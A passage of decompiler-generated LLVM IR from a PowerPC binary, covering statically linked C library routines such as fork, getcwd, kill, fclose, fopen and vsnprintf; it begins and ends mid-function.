  %v3_10002bc8 = icmp eq i32 %v1_10002bc8, 0
  store i32 %v0_10002bc4, i32* %r31.global-to-local, align 4
  br i1 %v3_10002bc8, label %dec_label_pc_10002be0, label %dec_label_pc_10002bd4

dec_label_pc_10002bd4:                            ; preds = %entry
  %v0_10002bd4 = call i32 @__errno_location()
  %v0_10002bd8 = load i32, i32* %r31.global-to-local, align 4
  %v2_10002bd8 = inttoptr i32 %v0_10002bd4 to i32*
  store i32 %v0_10002bd8, i32* %v2_10002bd8, align 4
  br label %dec_label_pc_10002be0

dec_label_pc_10002be0:                            ; preds = %entry, %dec_label_pc_10002bd4
  %v0_10002bf0 = phi i32 [ %v0_10002bc4, %entry ], [ -1, %dec_label_pc_10002bd4 ]
  ret i32 %v0_10002bf0

; uselistorder directives
  uselistorder label %dec_label_pc_10002be0, { 1, 0 }
}

define i32 @__libc_fork() local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10002c0c = call i32 @__asm_mfcr()
  %v1_10002c10 = and i32 %v0_10002c0c, 268435456
  %v3_10002c10 = icmp eq i32 %v1_10002c10, 0
  store i32 %v0_10002c0c, i32* %r31.global-to-local, align 4
  br i1 %v3_10002c10, label %dec_label_pc_10002c28, label %dec_label_pc_10002c1c

dec_label_pc_10002c1c:                            ; preds = %entry
  %v0_10002c1c = call i32 @__errno_location()
  %v0_10002c20 = load i32, i32* %r31.global-to-local, align 4
  %v2_10002c20 = inttoptr i32 %v0_10002c1c to i32*
  store i32 %v0_10002c20, i32* %v2_10002c20, align 4
  br label %dec_label_pc_10002c28

dec_label_pc_10002c28:                            ; preds = %entry, %dec_label_pc_10002c1c
  %v0_10002c38 = phi i32 [ %v0_10002c0c, %entry ], [ -1, %dec_label_pc_10002c1c ]
  ret i32 %v0_10002c38

; uselistorder directives
  uselistorder label %dec_label_pc_10002c28, { 1, 0 }
}

define i32 @getcwd(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r28, align 4
  %v3_10002c48 = icmp eq i32 %arg2, 0
  store i32 %arg1, i32* @r30, align 4
  %v3_10002c58 = icmp eq i32 %arg1, 0
  br i1 %v3_10002c48, label %dec_label_pc_10002c58, label %dec_label_pc_10002c8c

dec_label_pc_10002c58:                            ; preds = %entry
  br i1 %v3_10002c58, label %dec_label_pc_10002c74, label %dec_label_pc_10002c60

dec_label_pc_10002c60:                            ; preds = %dec_label_pc_10002c58
  %v0_10002c60 = call i32 @__errno_location()
  store i32 0, i32* @r30, align 4
  %v2_10002c6c = inttoptr i32 %v0_10002c60 to i32*
  store i32 22, i32* %v2_10002c6c, align 4
  br label %dec_label_pc_10002d24

dec_label_pc_10002c74:                            ; preds = %dec_label_pc_10002c58
  store i32 268446840, i32* @lr, align 4
  %v0_10002c74 = call i32 @__GI_getpagesize()
  %v1_10002c78 = icmp slt i32 %v0_10002c74, 4096
  %v0_10002c7c. = select i1 %v1_10002c78, i32 4096, i32 %v0_10002c74
  store i32 %v0_10002c7c., i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10002c9c

dec_label_pc_10002c8c:                            ; preds = %entry
  store i32 %arg2, i32* %r31.global-to-local, align 4
  store i32 %arg1, i32* @r29, align 4
  br i1 %v3_10002c58, label %dec_label_pc_10002c9c, label %dec_label_pc_10002cac

dec_label_pc_10002c9c:                            ; preds = %dec_label_pc_10002c74, %dec_label_pc_10002c8c
  %v0_10002c9c = phi i32 [ %v0_10002c7c., %dec_label_pc_10002c74 ], [ %arg2, %dec_label_pc_10002c8c ]
  store i32 %v0_10002c9c, i32* @r3, align 4
  store i32 268446884, i32* @lr, align 4
  %v0_10002ca0 = call i32 @malloc()
  store i32 %v0_10002ca0, i32* @r29, align 4
  %v3_10002ca4 = icmp eq i32 %v0_10002ca0, 0
  br i1 %v3_10002ca4, label %dec_label_pc_10002d20, label %dec_label_pc_10002c9c.dec_label_pc_10002cac_crit_edge

dec_label_pc_10002c9c.dec_label_pc_10002cac_crit_edge: ; preds = %dec_label_pc_10002c9c
  br label %dec_label_pc_10002cac

dec_label_pc_10002cac:                            ; preds = %dec_label_pc_10002c9c.dec_label_pc_10002cac_crit_edge, %dec_label_pc_10002c8c
  %v0_10002cbc = call i32 @__asm_mfcr()
  %v1_10002cc0 = and i32 %v0_10002cbc, 268435456
  %v3_10002cc0 = icmp eq i32 %v1_10002cc0, 0
  store i32 %v0_10002cbc, i32* %r31.global-to-local, align 4
  store i32 %v0_10002cbc, i32* @r4, align 4
  br i1 %v3_10002cc0, label %dec_label_pc_10002cdc, label %dec_label_pc_10002cd0

dec_label_pc_10002cd0:                            ; preds = %dec_label_pc_10002cac
  %v0_10002cd0 = call i32 @__errno_location()
  store i32 -1, i32* @r4, align 4
  %v0_10002cd8 = load i32, i32* %r31.global-to-local, align 4
  %v2_10002cd8 = inttoptr i32 %v0_10002cd0 to i32*
  store i32 %v0_10002cd8, i32* %v2_10002cd8, align 4
  %v0_10002cdc.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_10002cdc

dec_label_pc_10002cdc:                            ; preds = %dec_label_pc_10002cac, %dec_label_pc_10002cd0
  %v0_10002cdc = phi i32 [ %v0_10002cbc, %dec_label_pc_10002cac ], [ %v0_10002cdc.pre, %dec_label_pc_10002cd0 ]
  %v1_10002cdc = icmp slt i32 %v0_10002cdc, 0
  %v0_10002ce0 = load i32, i32* @r30, align 4
  %v3_10002ce0 = icmp eq i32 %v0_10002ce0, 0
  br i1 %v1_10002cdc, label %dec_label_pc_10002d10, label %dec_label_pc_10002ce8

dec_label_pc_10002ce8:                            ; preds = %dec_label_pc_10002cdc
  br i1 %v3_10002ce0, label %dec_label_pc_10002cec, label %dec_label_pc_10002d00.thread8

dec_label_pc_10002d00.thread8:                    ; preds = %dec_label_pc_10002ce8
  br label %dec_label_pc_10002d24

dec_label_pc_10002cec:                            ; preds = %dec_label_pc_10002ce8
  %v0_10002cec = load i32, i32* @r28, align 4
  %v3_10002cec = icmp eq i32 %v0_10002cec, 0
  br i1 %v3_10002cec, label %dec_label_pc_10002d00, label %dec_label_pc_10002d00.thread

dec_label_pc_10002d00.thread:                     ; preds = %dec_label_pc_10002cec
  br label %dec_label_pc_10002d08

dec_label_pc_10002d00:                            ; preds = %dec_label_pc_10002cec
  %v0_10002cf4 = load i32, i32* @r29, align 4
  store i32 268446972, i32* @lr, align 4
  %v1_10002cf8 = call i32 @realloc(i32 %v0_10002cf4)
  store i32 %v1_10002cf8, i32* @r30, align 4
  %v3_10002d00 = icmp eq i32 %v1_10002cf8, 0
  br i1 %v3_10002d00, label %dec_label_pc_10002d08, label %dec_label_pc_10002d24

dec_label_pc_10002d08:                            ; preds = %dec_label_pc_10002d00.thread, %dec_label_pc_10002d00
  %v0_10002d08 = load i32, i32* @r29, align 4
  store i32 %v0_10002d08, i32* @r30, align 4
  br label %dec_label_pc_10002d24

dec_label_pc_10002d10:                            ; preds = %dec_label_pc_10002cdc
  br i1 %v3_10002ce0, label %dec_label_pc_10002d14, label %dec_label_pc_10002d20

dec_label_pc_10002d14:                            ; preds = %dec_label_pc_10002d10
  %v0_10002d14 = load i32, i32* @r29, align 4
  store i32 %v0_10002d14, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_10002d1c.339 to i32), i32* @lr, align 4
  %v0_10002d18 = call i32 @free()
  br label %dec_label_pc_10002d24

dec_label_pc_10002d20:                            ; preds = %dec_label_pc_10002d10, %dec_label_pc_10002c9c
  store i32 0, i32* @r30, align 4
  br label %dec_label_pc_10002d24

dec_label_pc_10002d24:                            ; preds = %dec_label_pc_10002d00.thread8, %dec_label_pc_10002d00, %dec_label_pc_10002d14, %dec_label_pc_10002d08, %dec_label_pc_10002c60, %dec_label_pc_10002d20
  %v0_10002d28 = load i32, i32* @r30, align 4
  ret i32 %v0_10002d28

; uselistorder directives
  uselistorder i32 %v0_10002cbc, { 0, 2, 1, 3 }
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10002d24, { 5, 2, 3, 1, 0, 4 }
  uselistorder label %dec_label_pc_10002d08, { 1, 0 }
  uselistorder label %dec_label_pc_10002cdc, { 1, 0 }
  uselistorder label %dec_label_pc_10002c9c, { 1, 0 }
}

define i32 @__GI_getpagesize() local_unnamed_addr {
entry:
  %v3_10002d44 = load i32, i32* @global_var_1001d86c.340, align 4
  %v3_10002d48 = icmp eq i32 %v3_10002d44, 0
  %v0_10002d4c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_10002d48, i32 %v0_10002d4c)
  ret i32 %v3_10002d44
}

define i32 @__libc_getpid() local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10002d70 = call i32 @__asm_mfcr()
  %v1_10002d74 = and i32 %v0_10002d70, 268435456
  %v3_10002d74 = icmp eq i32 %v1_10002d74, 0
  store i32 %v0_10002d70, i32* %r31.global-to-local, align 4
  br i1 %v3_10002d74, label %dec_label_pc_10002d8c, label %dec_label_pc_10002d80

dec_label_pc_10002d80:                            ; preds = %entry
  %v0_10002d80 = call i32 @__errno_location()
  %v0_10002d84 = load i32, i32* %r31.global-to-local, align 4
  %v2_10002d84 = inttoptr i32 %v0_10002d80 to i32*
  store i32 %v0_10002d84, i32* %v2_10002d84, align 4
  br label %dec_label_pc_10002d8c

dec_label_pc_10002d8c:                            ; preds = %entry, %dec_label_pc_10002d80
  %v0_10002d9c = phi i32 [ %v0_10002d70, %entry ], [ -1, %dec_label_pc_10002d80 ]
  ret i32 %v0_10002d9c

; uselistorder directives
  uselistorder label %dec_label_pc_10002d8c, { 1, 0 }
}

define i32 @getppid() local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10002db8 = call i32 @__asm_mfcr()
  %v1_10002dbc = and i32 %v0_10002db8, 268435456
  %v3_10002dbc = icmp eq i32 %v1_10002dbc, 0
  store i32 %v0_10002db8, i32* %r31.global-to-local, align 4
  br i1 %v3_10002dbc, label %dec_label_pc_10002dd4, label %dec_label_pc_10002dc8

dec_label_pc_10002dc8:                            ; preds = %entry
  %v0_10002dc8 = call i32 @__errno_location()
  %v0_10002dcc = load i32, i32* %r31.global-to-local, align 4
  %v2_10002dcc = inttoptr i32 %v0_10002dc8 to i32*
  store i32 %v0_10002dcc, i32* %v2_10002dcc, align 4
  br label %dec_label_pc_10002dd4

dec_label_pc_10002dd4:                            ; preds = %entry, %dec_label_pc_10002dc8
  %v0_10002de4 = phi i32 [ %v0_10002db8, %entry ], [ -1, %dec_label_pc_10002dc8 ]
  ret i32 %v0_10002de4

; uselistorder directives
  uselistorder label %dec_label_pc_10002dd4, { 1, 0 }
}

define i32 @kill(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10002e00 = call i32 @__asm_mfcr()
  %v1_10002e04 = and i32 %v0_10002e00, 268435456
  %v3_10002e04 = icmp eq i32 %v1_10002e04, 0
  store i32 %v0_10002e00, i32* %r31.global-to-local, align 4
  br i1 %v3_10002e04, label %dec_label_pc_10002e1c, label %dec_label_pc_10002e10

dec_label_pc_10002e10:                            ; preds = %entry
  %v0_10002e10 = call i32 @__errno_location()
  %v0_10002e14 = load i32, i32* %r31.global-to-local, align 4
  %v2_10002e14 = inttoptr i32 %v0_10002e10 to i32*
  store i32 %v0_10002e14, i32* %v2_10002e14, align 4
  br label %dec_label_pc_10002e1c

dec_label_pc_10002e1c:                            ; preds = %entry, %dec_label_pc_10002e10
  %v0_10002e2c = phi i32 [ %v0_10002e00, %entry ], [ -1, %dec_label_pc_10002e10 ]
  ret i32 %v0_10002e2c

; uselistorder directives
  uselistorder label %dec_label_pc_10002e1c, { 1, 0 }
}

define i32 @__libc_select(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10002e48 = call i32 @__asm_mfcr()
  %v1_10002e4c = and i32 %v0_10002e48, 268435456
  %v3_10002e4c = icmp eq i32 %v1_10002e4c, 0
  store i32 %v0_10002e48, i32* %r31.global-to-local, align 4
  br i1 %v3_10002e4c, label %dec_label_pc_10002e64, label %dec_label_pc_10002e58

dec_label_pc_10002e58:                            ; preds = %entry
  %v0_10002e58 = call i32 @__errno_location()
  %v0_10002e5c = load i32, i32* %r31.global-to-local, align 4
  %v2_10002e5c = inttoptr i32 %v0_10002e58 to i32*
  store i32 %v0_10002e5c, i32* %v2_10002e5c, align 4
  br label %dec_label_pc_10002e64

dec_label_pc_10002e64:                            ; preds = %entry, %dec_label_pc_10002e58
  %v0_10002e74 = phi i32 [ %v0_10002e48, %entry ], [ -1, %dec_label_pc_10002e58 ]
  ret i32 %v0_10002e74

; uselistorder directives
  uselistorder label %dec_label_pc_10002e64, { 1, 0 }
}

define i32 @__GI_time(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10002e90 = call i32 @__asm_mfcr()
  %v1_10002e94 = and i32 %v0_10002e90, 268435456
  %v3_10002e94 = icmp eq i32 %v1_10002e94, 0
  store i32 %v0_10002e90, i32* %r31.global-to-local, align 4
  br i1 %v3_10002e94, label %dec_label_pc_10002eac, label %dec_label_pc_10002ea0

dec_label_pc_10002ea0:                            ; preds = %entry
  %v0_10002ea0 = call i32 @__errno_location()
  %v0_10002ea4 = load i32, i32* %r31.global-to-local, align 4
  %v2_10002ea4 = inttoptr i32 %v0_10002ea0 to i32*
  store i32 %v0_10002ea4, i32* %v2_10002ea4, align 4
  br label %dec_label_pc_10002eac

dec_label_pc_10002eac:                            ; preds = %entry, %dec_label_pc_10002ea0
  %v0_10002ebc = phi i32 [ %v0_10002e90, %entry ], [ -1, %dec_label_pc_10002ea0 ]
  ret i32 %v0_10002ebc

; uselistorder directives
  uselistorder label %dec_label_pc_10002eac, { 1, 0 }
}

define i32 @__libc_waitpid(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_10002ec4 = call i32 @wait4(i32 0)
  ret i32 %v1_10002ec4
}

define i32 @__libc_write(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10002ee0 = call i32 @__asm_mfcr()
  %v1_10002ee4 = and i32 %v0_10002ee0, 268435456
  %v3_10002ee4 = icmp eq i32 %v1_10002ee4, 0
  store i32 %v0_10002ee0, i32* %r31.global-to-local, align 4
  br i1 %v3_10002ee4, label %dec_label_pc_10002efc, label %dec_label_pc_10002ef0

dec_label_pc_10002ef0:                            ; preds = %entry
  %v0_10002ef0 = call i32 @__errno_location()
  %v0_10002ef4 = load i32, i32* %r31.global-to-local, align 4
  %v2_10002ef4 = inttoptr i32 %v0_10002ef0 to i32*
  store i32 %v0_10002ef4, i32* %v2_10002ef4, align 4
  br label %dec_label_pc_10002efc

dec_label_pc_10002efc:                            ; preds = %entry, %dec_label_pc_10002ef0
  %v0_10002f0c = phi i32 [ %v0_10002ee0, %entry ], [ -1, %dec_label_pc_10002ef0 ]
  ret i32 %v0_10002f0c

; uselistorder directives
  uselistorder label %dec_label_pc_10002efc, { 1, 0 }
}

define i32 @__GI_toupper(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_10002f10 = add i32 %arg1, 128
  %v1_10002f14 = mul i32 %arg1, 2
  %v2_10002f18 = icmp ugt i32 %v1_10002f10, 383
  %v0_10002f1c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_10002f18, i32 %v0_10002f1c)
  %v3_10002f24 = load i32, i32* inttoptr (i32 268556252 to i32*), align 4
  %v2_10002f28 = add i32 %v1_10002f14, %v3_10002f24
  %v3_10002f28 = inttoptr i32 %v2_10002f28 to i16*
  %v4_10002f28 = load i16, i16* %v3_10002f28, align 2
  %v5_10002f28 = sext i16 %v4_10002f28 to i32
  ret i32 %v5_10002f28
}

define i32 @__errno_location() local_unnamed_addr {
entry:
  ret i32 ptrtoint (i32* @global_var_1001d87c.341 to i32)
}

define i32 @__GI_fclose(i16* %arg1) local_unnamed_addr {
entry:
  %cr7_eq.global-to-local = alloca i1, align 1
  %tmp = ptrtoint i16* %arg1 to i32
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  store i32 %tmp, i32* @r31, align 4
  %v2_10002f50 = add i32 %tmp, 52
  %v3_10002f50 = inttoptr i32 %v2_10002f50 to i32*
  %v4_10002f50 = load i32, i32* %v3_10002f50, align 4
  store i32 %v4_10002f50, i32* @r28, align 4
  %v3_10002f54 = icmp eq i32 %v4_10002f50, 0
  store i1 %v3_10002f54, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10002f54, label %dec_label_pc_10002f5c, label %dec_label_pc_10002f7c

dec_label_pc_10002f5c:                            ; preds = %entry
  %v2_10002f64 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_10002f64, i32* @r3, align 4
  %v0_10002f70 = call i32 @__pthread_return_void()
  %v0_10002f78 = call i32 @__pthread_return_0()
  %v0_10002f7c.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10002f7c

dec_label_pc_10002f7c:                            ; preds = %entry, %dec_label_pc_10002f5c
  %v0_10002f8c = phi i32 [ %tmp, %entry ], [ %v0_10002f7c.pre, %dec_label_pc_10002f5c ]
  %v1_10002f7c = inttoptr i32 %v0_10002f8c to i16*
  %v2_10002f7c = load i16, i16* %v1_10002f7c, align 2
  %v3_10002f7c = zext i16 %v2_10002f7c to i32
  store i32 0, i32* @r27, align 4
  %v1_10002f84 = and i32 %v3_10002f7c, 64
  %v3_10002f84 = icmp eq i32 %v1_10002f84, 0
  br i1 %v3_10002f84, label %dec_label_pc_10002f98, label %dec_label_pc_10002f8c

dec_label_pc_10002f8c:                            ; preds = %dec_label_pc_10002f7c
  store i32 268447636, i32* @lr, align 4
  %v4_10002f90 = call i32 @fflush_unlocked(i16* %v1_10002f7c, i32 %v1_10002f84)
  store i32 %v4_10002f90, i32* @r27, align 4
  %v0_10002f98.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10002f98

dec_label_pc_10002f98:                            ; preds = %dec_label_pc_10002f7c, %dec_label_pc_10002f8c
  %v0_10002f98 = phi i32 [ %v0_10002f8c, %dec_label_pc_10002f7c ], [ %v0_10002f98.pre, %dec_label_pc_10002f8c ]
  %v1_10002f98 = add i32 %v0_10002f98, 4
  %v2_10002f98 = inttoptr i32 %v1_10002f98 to i32*
  %v3_10002f98 = load i32, i32* %v2_10002f98, align 4
  store i32 268447648, i32* @lr, align 4
  %v1_10002f9c = call i32 @__libc_close(i32 %v3_10002f98)
  %v3_10002fa0 = icmp eq i32 %v1_10002f9c, 0
  store i1 %v3_10002fa0, i1* %cr7_eq.global-to-local, align 1
  %tmp8 = icmp sgt i32 %v1_10002f9c, -1
  br i1 %tmp8, label %dec_label_pc_10002fac, label %dec_label_pc_10002fa8

dec_label_pc_10002fa8:                            ; preds = %dec_label_pc_10002f98
  store i32 -1, i32* @r27, align 4
  br label %dec_label_pc_10002fac

dec_label_pc_10002fac:                            ; preds = %dec_label_pc_10002f98, %dec_label_pc_10002fa8
  store i32 ptrtoint ([3 x i8]* @global_var_10006d28.342 to i32), i32* @r26, align 4
  store i32 ptrtoint (i32* @global_var_1001d4b4.343 to i32), i32* @r29, align 4
  %v1_10002fc0 = load i32, i32* @r31, align 4
  %v2_10002fc0 = add i32 %v1_10002fc0, 4
  %v3_10002fc0 = inttoptr i32 %v2_10002fc0 to i32*
  store i32 -1, i32* %v3_10002fc0, align 4
  %v2_10002fc4 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_10002fc4, i32* @r30, align 4
  store i32 %v2_10002fc4, i32* @r3, align 4
  %v0_10002fd4 = call i32 @__pthread_return_void()
  %v0_10002fdc = call i32 @__pthread_return_0()
  %v3_10002fe4 = load i32, i32* @global_var_1001d854.344, align 4
  store i32 %v2_10002fc4, i32* @r3, align 4
  %v1_10002ff0 = add i32 %v3_10002fe4, 1
  store i32 %v1_10002ff0, i32* @global_var_1001d854.344, align 4
  %v0_10002ff8 = call i32 @__pthread_return_void()
  %v0_10002ffc = load i32, i32* @r31, align 4
  %v1_10002ffc = inttoptr i32 %v0_10002ffc to i16*
  %v2_10002ffc = load i16, i16* %v1_10002ffc, align 2
  %v3_10002ffc = zext i16 %v2_10002ffc to i32
  %v0_10003000 = load i32, i32* @r28, align 4
  %v3_10003000 = icmp eq i32 %v0_10003000, 0
  store i1 %v3_10003000, i1* %cr7_eq.global-to-local, align 1
  %v1_10003004 = call i32 @__asm_rlwinm(i32 %v3_10002ffc, i32 0, i32 17, i32 18)
  %v1_1000300c = or i32 %v1_10003004, 48
  %v1_10003010 = trunc i32 %v1_1000300c to i16
  %v2_10003010 = load i32, i32* @r31, align 4
  %v3_10003010 = inttoptr i32 %v2_10003010 to i16*
  store i16 %v1_10003010, i16* %v3_10003010, align 2
  %v0_10003014 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10003014, label %dec_label_pc_10003018, label %dec_label_pc_10003024

dec_label_pc_10003018:                            ; preds = %dec_label_pc_10002fac
  %v2_10003018 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_10003018, i32* @r3, align 4
  %v0_10003020 = call i32 @__pthread_return_void()
  br label %dec_label_pc_10003024

dec_label_pc_10003024:                            ; preds = %dec_label_pc_10002fac, %dec_label_pc_10003018
  %v0_10003024 = load i32, i32* @r31, align 4
  %v1_10003024 = inttoptr i32 %v0_10003024 to i16*
  %v2_10003024 = load i16, i16* %v1_10003024, align 2
  %v1_10003028 = and i16 %v2_10003024, 16384
  %v3_10003028 = icmp eq i16 %v1_10003028, 0
  br i1 %v3_10003028, label %dec_label_pc_10003038, label %dec_label_pc_10003030

dec_label_pc_10003030:                            ; preds = %dec_label_pc_10003024
  %v1_10003030 = add i32 %v0_10003024, 8
  %v2_10003030 = inttoptr i32 %v1_10003030 to i32*
  %v3_10003030 = load i32, i32* %v2_10003030, align 4
  store i32 %v3_10003030, i32* @r3, align 4
  store i32 268447800, i32* @lr, align 4
  %v0_10003034 = call i32 @free()
  br label %dec_label_pc_10003038

dec_label_pc_10003038:                            ; preds = %dec_label_pc_10003024, %dec_label_pc_10003030
  store i32 %v2_10002fc4, i32* @r3, align 4
  %v0_10003044 = call i32 @__pthread_return_void()
  %v0_1000304c = call i32 @__pthread_return_0()
  %v3_10003054 = load i32, i32* @global_var_1001d858.345, align 4
  store i32 %v2_10002fc4, i32* @r3, align 4
  %v1_10003060 = add i32 %v3_10003054, 1
  store i32 %v1_10003060, i32* @global_var_1001d858.345, align 4
  %v0_10003068 = call i32 @__pthread_return_void()
  store i32 268447856, i32* @lr, align 4
  %v0_1000306c = call i32 @_stdio_openlist_dec_use()
  %v0_10003074 = load i32, i32* @r27, align 4
  ret i32 %v0_10003074

; uselistorder directives
  uselistorder i32 %tmp, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10003038, { 1, 0 }
  uselistorder label %dec_label_pc_10003024, { 1, 0 }
  uselistorder label %dec_label_pc_10002fac, { 1, 0 }
  uselistorder label %dec_label_pc_10002f98, { 1, 0 }
  uselistorder label %dec_label_pc_10002f7c, { 1, 0 }
}

define i32 @__GI_fopen(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 0, i32* @r5, align 4
  store i32 -1, i32* @r6, align 4
  %v3_10003090 = call i32 @_stdio_fopen(i32 0, i8* inttoptr (i32 -1 to i8*))
  ret i32 %v3_10003090
}

define i32 @vsprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 -1, i32* @r4, align 4
  %v0_100030a0 = call i32 @__GI_vsnprintf()
  ret i32 %v0_100030a0
}

define i32 @sprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  store i32 %arg4, i32* @r7, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  store i32 -1, i32* @r4, align 4
  store i32 %arg1, i32* @r5, align 4
  %v2_100030c4 = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_100030c4, i32* @r6, align 4
  store i32 2, i32* %stack_var_-104, align 4
  %v2_10003114 = ptrtoint i32* %stack_var_-96 to i32
  store i32 %v2_10003114, i32* %stack_var_-96, align 4
  store i32 268448032, i32* @lr, align 4
  %v0_1000311c = call i32 @__GI_vsnprintf()
  ret i32 %v0_1000311c
}

define i32 @__GI_vsnprintf() local_unnamed_addr {
entry:
  %r29.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %v0_1000313c = load i32, i32* @r4, align 4
  store i32 %v0_1000313c, i32* @r27, align 4
  store i32 208, i32* %stack_var_-104, align 4
  %v0_10003158 = load i32, i32* @r3, align 4
  %v1_10003158 = sub i32 -1, %v0_10003158
  store i32 %v1_10003158, i32* %r30.global-to-local, align 4
  store i32 0, i32* @r26, align 4
  store i32 %v0_10003158, i32* %r31.global-to-local, align 4
  %v2_1000316c = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_1000316c, i32* @r3, align 4
  %v0_10003170 = load i32, i32* @r5, align 4
  store i32 %v0_10003170, i32* %r29.global-to-local, align 4
  %v0_10003174 = load i32, i32* @r6, align 4
  store i32 %v0_10003174, i32* @r28, align 4
  store i32 268448132, i32* @lr, align 4
  %v0_10003180 = call i32 @__stdio_init_mutex()
  %v0_10003184 = load i32, i32* %r30.global-to-local, align 4
  %v1_10003184 = load i32, i32* @r27, align 4
  %v3_10003184 = icmp ugt i32 %v0_10003184, %v1_10003184
  %v0_10003188 = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_10003188, i32* @r4, align 4
  %v0_1000318c = load i32, i32* @r28, align 4
  store i32 %v0_1000318c, i32* @r5, align 4
  %v2_10003190 = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_10003190, i32* @r3, align 4
  br i1 %v3_10003184, label %dec_label_pc_1000319c, label %dec_label_pc_100031a0

dec_label_pc_1000319c:                            ; preds = %entry
  store i32 %v1_10003184, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_100031a0

dec_label_pc_100031a0:                            ; preds = %entry, %dec_label_pc_1000319c
  %v1_100031a0 = phi i32 [ %v0_10003184, %entry ], [ %v1_10003184, %dec_label_pc_1000319c ]
  %v0_100031a0 = load i32, i32* %r31.global-to-local, align 4
  store i32 268448192, i32* @lr, align 4
  %v0_100031bc = call i32 @_vfprintf_internal()
  %v0_100031c0 = load i32, i32* @r30, align 4
  %v3_100031c0 = icmp eq i32 %v0_100031c0, 0
  br i1 %v3_100031c0, label %dec_label_pc_100031e8, label %dec_label_pc_100031c8

dec_label_pc_100031c8:                            ; preds = %dec_label_pc_100031a0
  %v4_100031d4 = icmp eq i32 %v1_100031a0, 0
  %v1_100031d0 = sext i1 %v4_100031d4 to i32
  %v0_100031dc.v0_100031a0 = add i32 %v0_100031a0, %v1_100031d0
  %stack_var_-88.0 = inttoptr i32 %v0_100031dc.v0_100031a0 to i8*
  %v0_100031e4 = load i32, i32* @r26, align 4
  %v1_100031e4 = trunc i32 %v0_100031e4 to i8
  store i8 %v1_100031e4, i8* %stack_var_-88.0, align 1
  br label %dec_label_pc_100031e8

dec_label_pc_100031e8:                            ; preds = %dec_label_pc_100031a0, %dec_label_pc_100031c8
  ret i32 %v0_100031bc

; uselistorder directives
  uselistorder i32 %v0_10003158, { 1, 0 }
  uselistorder i32* %stack_var_-104, { 1, 0 }
  uselistorder label %dec_label_pc_100031e8, { 1, 0 }
  uselistorder label %dec_label_pc_100031a0, { 1, 0 }
}

define i32 @_stdio_fopen(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %cr0_eq.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v0_100031fc = load i32, i32* @lr, align 4
  store i32 %v0_100031fc, i32* %r0.global-to-local, align 4
  store i32 %arg1, i32* @r27, align 4
  %v0_10003210 = load i32, i32* @r5, align 4
  store i32 %v0_10003210, i32* @r31, align 4
  %v0_10003214 = load i32, i32* @r6, align 4
  store i32 %v0_10003214, i32* @r29, align 4
  %v3_10003218 = load i8, i8* %arg2, align 1
  %v4_10003218 = zext i8 %v3_10003218 to i32
  store i32 %v4_10003218, i32* %r0.global-to-local, align 4
  %v3_1000321c = icmp eq i8 %v3_10003218, 114
  br i1 %v3_1000321c, label %dec_label_pc_10003268, label %dec_label_pc_10003224

dec_label_pc_10003224:                            ; preds = %entry
  %v3_10003224 = icmp eq i8 %v3_10003218, 119
  store i32 577, i32* @r28, align 4
  br i1 %v3_10003224, label %dec_label_pc_1000326c, label %dec_label_pc_10003230

dec_label_pc_10003230:                            ; preds = %dec_label_pc_10003224
  %v3_10003230 = icmp eq i8 %v3_10003218, 97
  store i32 1089, i32* @r28, align 4
  br i1 %v3_10003230, label %dec_label_pc_1000326c, label %dec_label_pc_1000323c

dec_label_pc_1000323c:                            ; preds = %dec_label_pc_100032fc, %dec_label_pc_100032cc, %dec_label_pc_10003230
  %v0_1000323c = call i32 @__errno_location()
  %v0_10003240 = load i32, i32* @r31, align 4
